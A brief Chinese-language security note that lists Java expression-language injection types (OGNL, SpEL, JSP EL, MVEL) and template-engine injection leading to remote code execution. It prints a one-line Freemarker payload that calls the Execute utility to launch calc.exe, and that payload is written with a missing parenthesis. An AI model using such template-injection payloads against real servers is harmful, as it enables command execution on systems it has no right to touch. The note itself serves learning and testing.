框架EL表达式注入-SPEL&JSTL&OGNL等
Struts2-OGNL
Spring-SPEL
JSP-JSTL_EL
Elasticsearch-MVEL

由java后端模板引擎注入导致的RCE漏洞，如：Freemarker、Velocity、Thymeleaf等


```
Freemarker：在html中
<divclass="content-txt">${announce.content}</div>

<#assign value="freemarker.template.utility.Execute"?new()>${value"calc.exe")}
````